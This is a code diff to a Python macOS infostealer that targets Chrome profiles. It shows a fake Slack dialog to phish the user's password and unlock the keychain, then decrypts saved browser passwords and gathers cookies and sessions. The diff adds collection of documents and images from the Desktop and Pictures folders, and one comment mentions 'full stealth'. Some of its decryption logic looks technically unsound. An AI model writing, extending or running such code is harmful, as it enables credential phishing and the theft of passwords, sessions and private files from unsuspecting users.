@@ -15,11 +15,13 @@ def get_chrome_profiles():
     profiles.extend(base_dir.glob("Profile *"))
     return [p for p in profiles if p.exists()]
 
+
+
 def phish_password_via_slack_dialog():
     """Uses osascript to display a fake Slack update dialog and capture the password."""
     applescript = '''
     display dialog "An update is ready to install. Slack is trying to add a new helper tool.
-    
+
     Touch ID or enter your password to allow this." default answer "" with title "Slack" with icon caution \
     default button "Use Password..." with hidden answer true
     '''
@@ -43,53 +45,185 @@ def unlock_keychain(password):
 
 def get_encryption_key(profile_dir):
     local_state = profile_dir.parent / "Local State"
-    if not local_state.exists():
-        raise FileNotFoundError(f"Local State file not found: {local_state}")
-    with open(local_state, "r") as f:
-        state = json.load(f)
-    if "os_crypt" not in state or "encrypted_key" not in state["os_crypt"]:
-        print("No encryption key found in Local State (no saved passwords?). Skipping decryption.")
-        return None  # No key = no decryption needed
     
-    encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]  # Remove 'DPAPI' prefix
+    # First, try to read the Local State file to see if it has encrypted key
+    encrypted_key_from_local_state = None
+    if local_state.exists():
+        try:
+            with open(local_state, "r", encoding='utf-8') as f:
+                state = json.load(f)
+            if "os_crypt" in state and "encrypted_key" in state["os_crypt"]:
+                # This is the encrypted key from Local State that needs decryption
+                encrypted_key_from_local_state = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]  # Remove 'DPAPI' prefix
+        except Exception:
+            pass
     
-    # First, try normal access (in case permissions are already set)
+    # Try to get the key from keychain
+    chrome_key = None
+    service_names = ['Chrome Safe Storage', 'Chrome']  # Try in this order
+    
+    for service in service_names:
+        try:
+            # Try to extract the key using the security command
+            result = subprocess.run([
+                "security", "find-generic-password", "-w", "-s", service
+            ], capture_output=True, text=True, timeout=10)
+            
+            if result.returncode == 0 and result.stdout.strip():
+                chrome_key = result.stdout.strip().encode('utf-8')
+                break
+        except subprocess.TimeoutExpired:
+            continue
+        except Exception:
+            continue
+    
+    # If we already have both the encrypted key and the chrome key, try decrypting
+    if encrypted_key_from_local_state and chrome_key:
+        try:
+            # Use the chrome_key to decrypt the encrypted key from Local State
+            salt = b"saltysalt"
+            kdf = PBKDF2HMAC(
+                algorithm=hashes.SHA1(),
+                length=16,
+                salt=salt,
+                iterations=1003,
+            )
+            derived_key = kdf.derive(chrome_key)
+            
+            # Decrypt the encrypted key using the derived key
+            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+            iv = b' ' * 16  # 16 spaces as IV
+            cipher = Cipher(algorithms.AES(derived_key), modes.CBC(iv))
+            decryptor = cipher.decryptor()
+            decrypted_key = decryptor.update(encrypted_key_from_local_state) + decryptor.finalize()
+            
+            # Remove padding
+            return decrypted_key.rstrip(b'\x00')
+        except Exception:
+            # If decryption fails, we'll continue with other approaches
+            pass
+    
+    # If keychain access was successful, try using it directly
+    if chrome_key:
+        salt = b"saltysalt"
+        kdf = PBKDF2HMAC(
+            algorithm=hashes.SHA1(),
+            length=16,
+            salt=salt,
+            iterations=1003,
+        )
+        return kdf.derive(chrome_key)
+    
+    # If keychain access failed, try phishing approach to get user password
     try:
-        output = subprocess.check_output([
-            "security", "find-generic-password", "-wa", "Chrome Safe Storage"
-        ], stderr=subprocess.DEVNULL).decode().strip()
-        key_raw = output.encode()
-    except subprocess.CalledProcessError:
-        # Fallback to phishing if normal access fails
+        # Try to phish the password using a fake Slack dialog
         print("Normal access failed; initiating Slack phishing dialog...")  # Remove for full stealth
         password = phish_password_via_slack_dialog()
         unlock_keychain(password)
-        # Now retry normal access (should succeed silently)
-        output = subprocess.check_output([
-            "security", "find-generic-password", "-wa", "Chrome Safe Storage"
-        ], stderr=subprocess.DEVNULL).decode().strip()
-        key_raw = output.encode()
+        
+        # Now retry keychain access (should succeed silently)
+        for service in service_names:
+            try:
+                result = subprocess.run([
+                    "security", "find-generic-password", "-w", "-s", service
+                ], capture_output=True, text=True)
+                
+                if result.returncode == 0 and result.stdout.strip():
+                    chrome_key = result.stdout.strip().encode('utf-8')
+                    break
+            except Exception:
+                continue
+        
+        # If we got the key after phishing, proceed with the same logic
+        if encrypted_key_from_local_state and chrome_key:
+            try:
+                salt = b"saltysalt"
+                kdf = PBKDF2HMAC(
+                    algorithm=hashes.SHA1(),
+                    length=16,
+                    salt=salt,
+                    iterations=1003,
+                )
+                derived_key = kdf.derive(chrome_key)
+                
+                from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+                iv = b' ' * 16  # 16 spaces as IV
+                cipher = Cipher(algorithms.AES(derived_key), modes.CBC(iv))
+                decryptor = cipher.decryptor()
+                decrypted_key = decryptor.update(encrypted_key_from_local_state) + decryptor.finalize()
+                
+                return decrypted_key.rstrip(b'\x00')
+            except Exception:
+                pass
+        
+        # If Local State doesn't have the key but we have chrome_key
+        if chrome_key:
+            salt = b"saltysalt"
+            kdf = PBKDF2HMAC(
+                algorithm=hashes.SHA1(),
+                length=16,
+                salt=salt,
+                iterations=1003,
+            )
+            return kdf.derive(chrome_key)
+        
+    except Exception:
+        # If phishing failed, fall back to default empty password method
+        pass
     
-    salt = b"saltysalt"
-    kdf = PBKDF2HMAC(algorithm=hashes.SHA1(), length=16, salt=salt, iterations=1003)
-    return kdf.derive(key_raw)
+    # If all else fails, try default empty password (sometimes works)
+    try:
+        salt = b"saltysalt"
+        kdf = PBKDF2HMAC(
+            algorithm=hashes.SHA1(),
+            length=16,
+            salt=salt,
+            iterations=1003,
+        )
+        return kdf.derive(b"")  # Empty password
+    except Exception:
+        return None
 
 def decrypt_value(encrypted_value, key):
-    # Handle v10/v11 AES-GCM (modern)
-    if encrypted_value[:3] in (b'v10', b'v11'):
-        nonce = encrypted_value[3:15]
-        ciphertext = encrypted_value[15:]
-        aesgcm = AESGCM(key)
-        return aesgcm.decrypt(nonce, ciphertext, None).decode('utf-8')
-    else:
-        # Legacy AES-CBC (older Chrome)
+    # Handle v10/v11 (modern Chrome) - AES-128-CBC 
+    if encrypted_value and encrypted_value[:3] in (b'v10', b'v11'):
+        try:
+            # For v10/v11, Chrome uses AES-128-CBC with a fixed IV
+            # The Go code shows it uses IV of "20202020202020202020202020202020" which is hex for 16 spaces
+            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+            
+            # The IV is 16 bytes of hex "20" which corresponds to 16 space characters
+            iv = bytes.fromhex('20' * 16)  # 16 bytes, each with value 0x20 (space character)
+            
+            # The ciphertext is everything after the 3-byte prefix ('v10' or 'v11')
+            ciphertext = encrypted_value[3:]
+            
+            cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
+            decryptor = cipher.decryptor()
+            decrypted_padded = decryptor.update(ciphertext) + decryptor.finalize()
+            
+            # Remove PKCS7 padding
+            padding_len = decrypted_padded[-1]
+            return decrypted_padded[:-padding_len].decode('utf-8')
+        except Exception as e:
+            # If direct decryption fails, return error info
+            return f"[Decryption failed: {str(e)}]"
+    
+    # For other formats, try legacy AES-128-CBC
+    try:
         from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-        iv = encrypted_value[3:19]  # For v01, nonce is 16 bytes after 'v01'
+        iv = encrypted_value[3:19]  # For v01, IV is 16 bytes after 'v01'
         ciphertext = encrypted_value[19:]
         cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
         decryptor = cipher.decryptor()
         padded = decryptor.update(ciphertext) + decryptor.finalize()
-        return padded.rstrip(b'\x00').decode('utf-8')  # Remove padding
+        
+        # Remove PKCS7 padding
+        padding_len = padded[-1]
+        return padded[:-padding_len].decode('utf-8')
+    except Exception:
+        # If all decryption methods fail, return as is
+        return f"[Decryption failed: raw={encrypted_value}]"
 
 def extract_passwords(profile_dir):
     key = get_encryption_key(profile_dir)
@@ -150,6 +284,29 @@ def extract_sessions(profile_dir):
                 data[session_file.name] = base64.b64encode(f.read()).decode()
     return data
 
+def extract_desktop_and_pictures_files():
+    import os
+    from pathlib import Path
+    files = []
+    
+    # Get desktop files
+    desktop_path = Path.home() / "Desktop"
+    if desktop_path.exists():
+        for file_path in desktop_path.rglob("*"):
+            if file_path.is_file() and file_path.suffix.lower() in ['.pdf', '.doc', '.docx', '.txt', '.jpg', '.jpeg', '.png', '.gif', '.xlsx', '.xls', '.ppt', '.pptx', '.rtf', '.odt']:
+                if file_path.stat().st_size < 10 * 1024 * 1024:  # Only files < 10MB
+                    files.append(str(file_path))
+    
+    # Get pictures files
+    pictures_path = Path.home() / "Pictures"
+    if pictures_path.exists():
+        for file_path in pictures_path.rglob("*"):
+            if file_path.is_file() and file_path.suffix.lower() in ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp']:
+                if file_path.stat().st_size < 10 * 1024 * 1024:  # Only files < 10MB
+                    files.append(str(file_path))
+    
+    return files
+
 def extract_pdfs(profile_dir):
     pdfs = list(profile_dir.rglob("*.pdf"))
     return [str(p) for p in pdfs]
@@ -159,5 +316,6 @@ def extract_all(profile_dir):
         "passwords": extract_passwords(profile_dir),
         "cookies": extract_cookies(profile_dir),
         "sessions": extract_sessions(profile_dir),
-        "pdf_paths": extract_pdfs(profile_dir)
+        "pdf_paths": extract_pdfs(profile_dir),
+        "desktop_pictures_files": extract_desktop_and_pictures_files()
     }
